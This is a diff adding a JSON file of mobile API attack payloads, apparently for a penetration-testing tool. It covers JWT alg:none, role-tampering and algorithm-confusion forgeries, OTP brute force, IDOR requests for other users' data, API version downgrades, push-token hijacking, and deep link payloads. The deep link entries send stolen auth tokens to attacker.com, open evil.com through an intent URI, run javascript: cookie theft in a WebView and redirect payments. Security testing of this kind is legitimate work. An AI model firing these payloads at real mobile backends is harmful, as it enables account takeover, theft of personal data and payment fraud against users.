@@ -1,0 +1,89 @@
+{
+  "category": "mobile_api",
+  "contexts": {
+    "certificate_pinning_bypass": {
+      "description": "Post-pinning-bypass payloads for testing mobile API backends once traffic is intercepted via Burp proxy (Frida/Objection already applied)",
+      "payloads": [
+        {"payload": "GET /api/v1/config HTTP/1.1\r\nHost: api.target.com\r\nX-Api-Key: HARDCODED_KEY\r\n", "description": "Replay hardcoded API key from decompiled binary — test if server validates key origin", "waf_bypass": false},
+        {"payload": "GET /api/v1/user/profile HTTP/1.1\r\nAuthorization: Bearer OLD_TOKEN\r\n", "description": "Replay captured JWT after logout — test token revocation enforcement", "waf_bypass": false},
+        {"payload": "GET /api/debug/info HTTP/1.1\r\nHost: api.target.com\r\n", "description": "Debug endpoint probe — mobile backends often leave /debug, /status, /health exposed", "waf_bypass": false},
+        {"payload": "GET /api/internal/admin HTTP/1.1\r\nHost: api.target.com\r\nX-Mobile-App: true\r\n", "description": "Internal API probe with mobile app header — test for hidden admin endpoints", "waf_bypass": false},
+        {"payload": "GET /api/v1/config HTTP/1.1\r\nHost: api.target.com\r\nX-App-Version: 0.0.1\r\n", "description": "Old app version header — test if old API versions with less security are still accepted", "waf_bypass": false},
+        {"payload": "GET /.well-known/assetlinks.json HTTP/1.1\r\nHost: target.com\r\n", "description": "Android App Links asset file — reveals associated app package names and certificate fingerprints", "waf_bypass": false}
+      ]
+    },
+    "api_key_extraction": {
+      "description": "Payloads to test hardcoded API keys, secrets, and credentials found in intercepted mobile traffic or decompiled binaries",
+      "payloads": [
+        {"payload": "Authorization: Basic dGVzdDp0ZXN0", "description": "Base64-decoded basic auth from binary — test:test default credential probe", "waf_bypass": false},
+        {"payload": "X-Api-Key: AIzaSy0000000000000000000000000000000000", "description": "Google Maps API key format probe — check if server-side restriction exists", "waf_bypass": false},
+        {"payload": "X-Parse-Application-Id: APP_ID\r\nX-Parse-REST-API-Key: REST_KEY\r\n", "description": "Parse Server keys from decompiled app — test direct backend access bypassing mobile client", "waf_bypass": false},
+        {"payload": "Authorization: key=AAAA:FIREBASE_SERVER_KEY", "description": "Firebase Cloud Messaging server key — test if FCM key from app can send push to arbitrary devices", "waf_bypass": false},
+        {"payload": "X-AWS-Access-Key: AKIAIOSFODNN7EXAMPLE\r\nX-AWS-Secret-Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\r\n", "description": "AWS keys from mobile traffic — probe for direct S3/DynamoDB access bypassing backend", "waf_bypass": false},
+        {"payload": "GET /api/v1/graphql?query={__schema{types{name,fields{name}}}}\r\nX-Api-Key: EXTRACTED_KEY\r\n", "description": "GraphQL introspection with extracted API key — enumerate full schema accessible to mobile client", "waf_bypass": false},
+        {"payload": "GET /api/v1/keys HTTP/1.1\r\nAuthorization: Bearer VALID_TOKEN\r\n", "description": "API key listing endpoint — test if mobile token grants access to key management", "waf_bypass": false}
+      ]
+    },
+    "broken_auth": {
+      "description": "Mobile API broken authentication payloads — JWT manipulation, weak tokens, session fixation targeting mobile backends",
+      "payloads": [
+        {"payload": "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.", "description": "JWT alg:none bypass — remove signature, set algorithm to none for admin role", "waf_bypass": false},
+        {"payload": "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.SIGNATURE", "description": "JWT role tampering — change role claim to admin, resign with common secrets", "waf_bypass": false},
+        {"payload": "X-Device-Id: 00000000-0000-0000-0000-000000000000\r\nAuthorization: Bearer VALID_TOKEN\r\n", "description": "Zero device ID — test if device binding is enforced on JWT validation", "waf_bypass": false},
+        {"payload": "POST /api/v1/auth/login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"phone\":\"+1234567890\",\"otp\":\"000000\"}", "description": "OTP brute force — test rate limiting on mobile OTP verification (common 4-6 digit codes)", "waf_bypass": false},
+        {"payload": "POST /api/v1/auth/login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"phone\":\"+1234567890\",\"otp\":\"123456\",\"device_id\":\"attacker_device\"}", "description": "Session fixation via device_id — bind victim session to attacker device", "waf_bypass": false},
+        {"payload": "POST /api/v1/auth/refresh HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"refresh_token\":\"CAPTURED_REFRESH_TOKEN\"}", "description": "Refresh token replay — test if refresh tokens are single-use and properly rotated", "waf_bypass": false},
+        {"payload": "POST /api/v1/auth/verify HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"token\":\"VALID_TOKEN\",\"user_id\":2}", "description": "Token-user mismatch — send valid token with different user_id to test binding", "waf_bypass": false},
+        {"payload": "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.HMAC_SIGNED", "description": "JWT algorithm confusion RS256->HS256 — sign with public key as HMAC secret", "waf_bypass": true}
+      ]
+    },
+    "insecure_data_storage": {
+      "description": "Payloads to detect excessive data exposure, PII leakage, and insecure data handling in mobile API responses",
+      "payloads": [
+        {"payload": "GET /api/v1/user/profile HTTP/1.1\r\nAuthorization: Bearer VALID_TOKEN\r\n", "description": "Full profile response — check for excessive fields (SSN, DOB, payment info, internal IDs) beyond what the mobile UI displays", "waf_bypass": false},
+        {"payload": "GET /api/v1/users?page=1&per_page=100 HTTP/1.1\r\nAuthorization: Bearer VALID_TOKEN\r\n", "description": "User listing endpoint — test if mobile user token grants access to other users' PII", "waf_bypass": false},
+        {"payload": "GET /api/v1/user/2/profile HTTP/1.1\r\nAuthorization: Bearer USER1_TOKEN\r\n", "description": "IDOR on user profile — access another user's data with own token (OWASP M1)", "waf_bypass": false},
+        {"payload": "GET /api/v1/transactions?include=all HTTP/1.1\r\nAuthorization: Bearer VALID_TOKEN\r\n", "description": "Verbose include parameter — test if API returns full transaction details including card numbers", "waf_bypass": false},
+        {"payload": "GET /api/v1/user/profile HTTP/1.1\r\nAuthorization: Bearer VALID_TOKEN\r\nAccept: application/xml\r\n", "description": "XML content negotiation — test if XML response includes additional fields not in JSON response", "waf_bypass": false},
+        {"payload": "GET /api/v1/logs HTTP/1.1\r\nAuthorization: Bearer VALID_TOKEN\r\n", "description": "Client log endpoint — test if server stores and exposes mobile client logs containing sensitive data", "waf_bypass": false},
+        {"payload": "GET /api/v1/user/export HTTP/1.1\r\nAuthorization: Bearer VALID_TOKEN\r\n", "description": "Data export endpoint — test for mass PII export capability via mobile API", "waf_bypass": false}
+      ]
+    },
+    "api_versioning_abuse": {
+      "description": "API versioning abuse payloads — access deprecated or beta endpoints with weaker security controls",
+      "payloads": [
+        {"payload": "GET /api/v1/user/profile HTTP/1.1\r\nHost: api.target.com\r\n", "description": "v1 endpoint — older version may lack rate limiting, auth checks, or input validation", "waf_bypass": false},
+        {"payload": "GET /api/v0/admin/users HTTP/1.1\r\nHost: api.target.com\r\n", "description": "v0 pre-release endpoint — often has debug features and no auth", "waf_bypass": false},
+        {"payload": "GET /api/beta/user/profile HTTP/1.1\r\nHost: api.target.com\r\n", "description": "Beta API path — test for unreleased features with incomplete access controls", "waf_bypass": false},
+        {"payload": "GET /api/v2/user/profile HTTP/1.1\r\nHost: api.target.com\r\nApi-Version: 1\r\n", "description": "Version header downgrade — send v1 version header to v2 endpoint for parser confusion", "waf_bypass": false},
+        {"payload": "GET /api/v1/user/profile HTTP/1.1\r\nHost: api.target.com\r\nAccept: application/vnd.api.v1+json\r\n", "description": "Content negotiation versioning — request old API version via Accept header", "waf_bypass": false},
+        {"payload": "GET /api/v3/admin/config HTTP/1.1\r\nHost: api.target.com\r\n", "description": "Future version probe — test if v3/v4/v5 exists with different access controls", "waf_bypass": false},
+        {"payload": "GET /api/v1/user/profile HTTP/1.1\r\nHost: api-staging.target.com\r\n", "description": "Staging API host — mobile apps sometimes hardcode staging URLs with relaxed auth", "waf_bypass": false},
+        {"payload": "GET /api/v1/user/profile HTTP/1.1\r\nHost: api.target.com\r\nX-API-Version: 2019-01-01\r\n", "description": "Date-based API versioning — request old snapshot with deprecated security model", "waf_bypass": false}
+      ]
+    },
+    "deeplink_abuse": {
+      "description": "Deep link and intent scheme injection payloads for mobile app URI handlers intercepted in traffic",
+      "payloads": [
+        {"payload": "Location: myapp://callback?token=STOLEN_TOKEN&redirect=https://attacker.com", "description": "OAuth callback deep link hijack — inject redirect parameter to steal auth token", "waf_bypass": false},
+        {"payload": "Location: intent://evil.com#Intent;scheme=https;package=com.target.app;end", "description": "Android Intent URI — force target app to open attacker URL via intent scheme", "waf_bypass": false},
+        {"payload": "Location: myapp://webview?url=https://attacker.com/phish", "description": "WebView URL injection — open attacker page in app's trusted WebView context", "waf_bypass": false},
+        {"payload": "Location: myapp://webview?url=javascript:alert(document.cookie)", "description": "JavaScript URI in WebView deep link — XSS in mobile WebView if javascript: scheme not filtered", "waf_bypass": false},
+        {"payload": "Location: myapp://payment?amount=0.01&recipient=attacker", "description": "Payment deep link tampering — modify amount/recipient in payment flow redirect", "waf_bypass": false},
+        {"payload": "GET /api/v1/auth/callback?code=AUTH_CODE&state=CSRF_TOKEN HTTP/1.1\r\n", "description": "OAuth callback without state validation — test if mobile OAuth flow is vulnerable to CSRF", "waf_bypass": false},
+        {"payload": "Location: myapp://reset-password?token=VALID_RESET_TOKEN&new_password=attacker123", "description": "Password reset deep link — test if reset token in deep link can be replayed or lacks binding", "waf_bypass": false}
+      ]
+    },
+    "push_notification_abuse": {
+      "description": "Push notification token hijack and abuse payloads for FCM/APNs endpoints found in mobile API traffic",
+      "payloads": [
+        {"payload": "POST /api/v1/device/register HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"device_token\":\"VICTIM_FCM_TOKEN\",\"user_id\":\"attacker_id\"}", "description": "FCM token rebinding — register victim's push token to attacker account to intercept notifications", "waf_bypass": false},
+        {"payload": "POST /api/v1/notifications/send HTTP/1.1\r\nContent-Type: application/json\r\nAuthorization: Bearer USER_TOKEN\r\n\r\n{\"to\":\"VICTIM_FCM_TOKEN\",\"title\":\"Test\",\"body\":\"Phish\"}", "description": "Direct push send — test if mobile user token allows sending push to arbitrary FCM tokens", "waf_bypass": false},
+        {"payload": "POST /api/v1/device/register HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"device_token\":\"ATTACKER_TOKEN\",\"user_id\":\"victim_id\"}", "description": "Device token IDOR — register attacker's push token for victim user to receive their notifications", "waf_bypass": false},
+        {"payload": "GET /api/v1/notifications/history HTTP/1.1\r\nAuthorization: Bearer VALID_TOKEN\r\n", "description": "Notification history — test for sensitive data in push notification logs (OTP codes, messages)", "waf_bypass": false},
+        {"payload": "POST /api/v1/device/register HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"device_token\":\"VALID_TOKEN\",\"platform\":\"android\",\"app_version\":\"1.0\"}", "description": "Multiple device registration — test if server limits device count per account (device farm abuse)", "waf_bypass": false},
+        {"payload": "DELETE /api/v1/device/VICTIM_DEVICE_ID HTTP/1.1\r\nAuthorization: Bearer ATTACKER_TOKEN\r\n", "description": "Device deregistration IDOR — unregister victim's device to deny push notifications", "waf_bypass": false}
+      ]
+    }
+  }
+}
